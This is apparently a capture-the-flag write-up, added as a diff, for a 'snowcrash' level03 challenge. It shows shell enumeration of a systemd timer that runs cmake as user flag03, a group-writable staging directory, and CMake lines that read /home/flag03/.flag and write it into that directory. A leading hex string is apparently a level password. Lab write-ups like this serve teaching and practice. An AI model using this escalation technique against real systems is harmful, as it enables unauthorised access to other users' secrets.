@@ -1,0 +1,116 @@
+b209ea91ad7a5c2a0b0f4e195ca4
+
+```bash
+level03@snowcrash:~$ lsof /opt/snowcrash/level03/
+level03@snowcrash:~$
+```
+
+```bash
+level03@snowcrash:~$ fuser /opt/snowcrash/level03/
+level03@snowcrash:~$
+```
+
+```bash
+level03@snowcrash:~$ grep -rn CMakeLists /etc/
+/etc/systemd/system/burbclave.service:8:ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
+```
+
+```bash
+level03@snowcrash:~$ cat /etc/systemd/system/burbclave.service
+[Unit]
+Description=Burbclave build runner (one-shot)
+After=network.target
+
+[Service]
+Type=oneshot
+User=flag03
+ExecStart=/usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
+StandardOutput=null
+StandardError=null
+```
+
+```bash
+level03@snowcrash:~$ cat /etc/burbclave/burbclave.conf
+cat: /etc/burbclave/burbclave.conf: Permission denied
+```
+
+```bash
+level03@snowcrash:~$ ls -laR /var/lib/burbclave/
+/var/lib/burbclave/:
+total 12
+drwxrwxr-x  3 root burbclave 4096 Jun  9 19:03 .
+drwxr-xr-x 46 root root      4096 Nov 10 16:31 ..
+drwxrwxr-x  2 root burbclave 4096 Jun  9 19:03 staging
+
+/var/lib/burbclave/staging:
+total 8
+drwxrwxr-x 2 root burbclave 4096 Jun  9 19:03 .
+drwxrwxr-x 3 root burbclave 4096 Jun  9 19:03 ..
+level03@snowcrash:/etc/systemd/system$
+```
+
+```bash
+level03@snowcrash:~$ id level03
+uid=1004(level03) gid=1006(level03) groups=1006(level03),1001(levelgroup),988(burbclave)
+```
+
+```bash
+level03@snowcrash:~$ find / -name "*burbclave*" 2>/dev/null
+/var/lib/burbclave
+/etc/systemd/system/burbclave.timer
+/etc/systemd/system/burbclave.service
+/etc/systemd/system/timers.target.wants/burbclave.timer
+/etc/burbclave
+```
+
+```bash
+level03@snowcrash:~$ systemctl list-timers --all | grep burbclave
+Mon 2026-11-16 20:39:33 UTC       4s Mon 2026-11-16 20:38:33 UTC      55s ago burbclave.timer                burbclave.service
+```
+
+```bash
+level03@snowcrash:/var/lib/burbclave/staging$ systemctl status burbclave.service
+○ burbclave.service - Burbclave build runner (one-shot)
+     Loaded: loaded (/etc/systemd/system/burbclave.service; static)
+     Active: inactive (dead) since Wed 2026-11-18 17:45:54 UTC; 3s a>
+TriggeredBy: ● burbclave.timer
+    Process: 14035 ExecStart=/usr/bin/cmake -P /opt/snowcrash/level0>
+   Main PID: 14035 (code=exited, status=0/SUCCESS)
+        CPU: 53ms
+
+```
+
+```bash
+level03@snowcrash:/etc/systemd/system$ cat burbclave.timer 
+[Unit]
+Description=Burbclave build runner timer — runs every minute
+
+[Timer]
+OnBootSec=30s
+OnUnitActiveSec=60s
+AccuracySec=1s
+Unit=burbclave.service
+
+[Install]
+WantedBy=timers.target
+```
+
+```bash
+level03@snowcrash:~$ /usr/bin/cmake -P /opt/snowcrash/level03/CMakeLists.txt
+CMake Warning at /opt/snowcrash/level03/CMakeLists.txt:55 (message):
+  BurbclaveRuntime is only validated on Linux
+
+
+CMake Error at /opt/snowcrash/level03/CMakeLists.txt:63 (file):
+  file failed to open for reading (Permission denied):
+
+    /etc/burbclave/burbclave.conf
+```
+
+creation de build.cmake dans staging
+utiliser build.cmake copier, cat le flag n'a rien donne, mais le faire ecrire dedans oui
+
+```bash
+file(READ "/home/flag03/.flag" FLAG_CONTENT)
+file(WRITE "/var/lib/burbclave/staging/build.cmake" "# FLAG: ${FLAG_CONTENT}\n")
+```
